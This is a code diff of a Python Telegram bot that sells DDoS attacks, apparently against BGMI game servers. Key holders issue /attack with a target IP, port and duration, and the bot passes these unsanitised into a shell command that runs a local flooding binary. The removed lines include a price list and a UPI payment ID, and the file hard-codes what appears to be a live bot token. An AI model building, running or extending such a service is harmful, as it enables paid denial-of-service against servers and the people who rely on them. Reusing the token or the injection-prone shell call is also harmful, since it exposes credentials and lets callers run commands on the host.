@@ -1,118 +1,93 @@
 import asyncio
-import datetime
 import random
 import string
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
+# Bot Credentials
 TELEGRAM_BOT_TOKEN = '7675437323:AAGqGH5mhWMUbjpoFuF2I2offywpY2Ayay0'
-ADMIN_USER_ID = 7129010361
+ADMIN_USER_ID = 7129010361  # अपने टेलीग्राम ID से बदलो
 USERS_FILE = 'users.txt'
 KEYS_FILE = 'keys.txt'
+attack_in_progress = False
 
+# Load Users & Keys
 def load_users():
     try:
         with open(USERS_FILE) as f:
-            return {line.strip().split(",")[0]: line.strip().split(",")[1] for line in f}
+            return set(line.strip() for line in f)
     except FileNotFoundError:
-        return {}
+        return set()
 
 def save_users(users):
     with open(USERS_FILE, 'w') as f:
-        for user, expiry in users.items():
-            f.write(f"{user},{expiry}\n")
+        f.writelines(f"{user}\n" for user in users)
 
-def generate_key():
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+users = load_users()
 
 def load_keys():
     try:
         with open(KEYS_FILE) as f:
-            return {line.strip().split(",")[0]: line.strip().split(",")[1] for line in f}
+            return set(line.strip() for line in f)
     except FileNotFoundError:
-        return {}
+        return set()
 
 def save_keys(keys):
     with open(KEYS_FILE, 'w') as f:
-        for key, expiry in keys.items():
-            f.write(f"{key},{expiry}\n")
+        f.writelines(f"{key}\n" for key in keys)
 
-users = load_users()
 keys = load_keys()
 
+# Start Command
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "🚀 *WELCOME TO THE ULTIMATE ATTACK BOT!* 🚀\n\n"
-        "🔥 *POWERED BY:* ⚡[RAVI]⚡\n"
-        "💀 *OWNER:* @R_SDanger\n"
-        "⚡ *FASTEST DDOS ATTACKS AVAILABLE!*\n\n"
-        "🔹 *COMMAND LIST:*\n"
-        "`/attack <IP> <PORT> <TIME>` – *Launch an attack!*\n"
-        "`/genkey <days>` – *Generate a key (Admin only)*\n"
-        "`/redeem <key>` – *Activate access!*\n"
-        "`/buy` – *Check VIP pricing!*\n"
-        "`/into` – *Check your access expiry!*"
+        "*🔥 Welcome To 💸[RAVI]🚀 DDOS*\n"
+        "*🔥 Owner @R_SDanger*\n"
+        "*🔥 SERVER BGMI*\n"
+        "*🔥 Use /attack To Start Attack*\n"
+        "*🔥 Generate VIP Key: /genkey*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def buy(update: Update, context: CallbackContext):
+# Generate & Redeem Key
+async def genkey(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
-    message = (
-        "🔥 *BUY VIP ACCESS* 🔥\n\n"
-        "💰 *PRICING:*\n"
-        "- 1 DAY: 80\n"
-        "- 7 DAYS: 400\n"
-        "- 30 DAYS: $1200\n\n"
-        "🚀 *PAYMENT METHODS:*\n"
-        "- UPI: `ddosseller9953@axl`\n"
-        "- ✅🚀: `phonepay.me/example`\n\n"
-        "📩 *AFTER PAYMENT, SEND SCREENSHOT TO ADMIN!* \n"
-        "👑 *OWNER:* @R_SDanger"
-    )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def into(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-
-    if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="❌ *YOU HAVE NO ACTIVE ACCESS!*", parse_mode='Markdown')
+    if chat_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ Only Admin Can Generate Keys!*", parse_mode='Markdown')
         return
 
-    expiry_date = users[user_id]
-    await context.bot.send_message(chat_id=chat_id, text=f"🕐 *VIP ACCESS INFO* 🕐\n\n✅ *YOUR ACCESS IS VALID!*\n🔴 *EXPIRES ON:* `{expiry_date}`\n\n⚡ *OWNER:* @R_SDanger", parse_mode='Markdown')
+    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    keys.add(key)
+    save_keys(keys)
+    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 New VIP Key: `{key}`*", parse_mode='Markdown')
 
-async def attack(update: Update, context: CallbackContext):
+async def redeem(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = str(update.effective_user.id)
     args = context.args
 
-    if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="❌ *YOU NEED A KEY!* USE `/redeem <key>`", parse_mode='Markdown')
+    if len(args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="*Usage: /redeem <key>*", parse_mode='Markdown')
         return
 
-    if users[user_id] < datetime.datetime.now().strftime('%Y-%m-%d'):
-        await context.bot.send_message(chat_id=chat_id, text="❌ *YOUR ACCESS HAS EXPIRED!*", parse_mode='Markdown')
-        return
+    key = args[0].strip()
 
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="🛠 *USAGE:* `/attack <ip> <port> <time>`", parse_mode='Markdown')
-        return
+    if key in keys:
+        keys.remove(key)
+        save_keys(keys)
+        users.add(user_id)
+        save_users(users)
+        await context.bot.send_message(chat_id=chat_id, text="*✅ VIP Access Granted!*", parse_mode='Markdown')
+    else:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid Key!*", parse_mode='Markdown')
 
-    ip, port, time = args
-    await context.bot.send_message(chat_id=chat_id, text=(
-        f"💥 *ATTACK INITIATED!* 💥\n\n"
-        f"🎯 *TARGET:* `{ip}`\n"
-        f"🚀 *PORT:* `{port}`\n"
-        f"⏳ *DURATION:* `{time} sec`\n\n"
-        f"🔥 *OWNER:* @R_SDanger\n"
-        f"⚡ *POWERED BY:* ☠️[RAVI]🚀"
-    ), parse_mode='Markdown')
-
-    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
-
+# Attack System
 async def run_attack(chat_id, ip, port, time, context):
+    global attack_in_progress
+    attack_in_progress = True
+
     try:
         process = await asyncio.create_subprocess_shell(
             f"./pubg {ip} {port} {time} 100",
@@ -120,57 +95,54 @@ async def run_attack(chat_id, ip, port, time, context):
             stderr=asyncio.subprocess.PIPE
         )
         stdout, stderr = await process.communicate()
+
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
+
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *ERROR:* `{str(e)}`", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')
 
-    await context.bot.send_message(chat_id=chat_id, text="✅ *ATTACK COMPLETED!* ✅", parse_mode='Markdown')
+    finally:
+        attack_in_progress = False
+        await context.bot.send_message(chat_id=chat_id, text=(
+            f"✅ **Attack Completed!** ✅\n"
+            f"🔥 **Owner: @R_SDanger**\n"
+            f"🔥 **Server: BGMI**"
+        ), parse_mode='Markdown')
 
-async def genkey(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="❌ *YOU ARE NOT AN ADMIN!*", parse_mode='Markdown')
-        return
-
-    if len(context.args) != 1 or not context.args[0].isdigit():
-        await context.bot.send_message(chat_id=chat_id, text="🔑 *USAGE:* `/genkey <days>`", parse_mode='Markdown')
-        return
-
-    days = int(context.args[0])
-    expiry_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime('%Y-%m-%d')
-    key = generate_key()
-    keys[key] = expiry_date
-    save_keys(keys)
-
-    await context.bot.send_message(chat_id=chat_id, text=f"✅ *KEY GENERATED:* `{key}`\n🔴 *VALID TILL:* `{expiry_date}`", parse_mode='Markdown')
-
-async def redeem(update: Update, context: CallbackContext):
+async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = str(update.effective_user.id)
+    args = context.args
 
-    if len(context.args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="🔑 *USAGE:* `/redeem <key>`", parse_mode='Markdown')
+    if user_id not in users:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ VIP Access Required! Use /redeem*", parse_mode='Markdown')
         return
 
-    key = context.args[0]
-    if key not in keys:
-        await context.bot.send_message(chat_id=chat_id, text="❌ *INVALID KEY!*", parse_mode='Markdown')
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
         return
 
-    users[user_id] = keys[key]
-    save_users(users)
-    del keys[key]
-    save_keys(keys)
+    ip, port, time = args
+    await context.bot.send_message(chat_id=chat_id, text=(
+        f"🚀 **Attack Launched!** 🚀\n"
+        f"🎯 **Target:** `{ip}`\n"
+        f"🔥 **Port:** `{port}`\n"
+        f"⏳ **Duration:** `{time} seconds`\n"
+        f"💀 **Powered By @R_SDanger**"
+    ), parse_mode='Markdown')
 
-    await context.bot.send_message(chat_id=chat_id, text=f"✅ *ACCESS GRANTED!*\n🕐 *VALID TILL:* `{users[user_id]}`", parse_mode='Markdown')
+    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
 
+# Main Function
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("buy", buy))
-    application.add_handler(CommandHandler("into", into))
-    application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("genkey", genkey))
     application.add_handler(CommandHandler("redeem", redeem))
+    application.add_handler(CommandHandler("attack", attack))
     application.run_polling()
 
 if __name__ == '__main__':
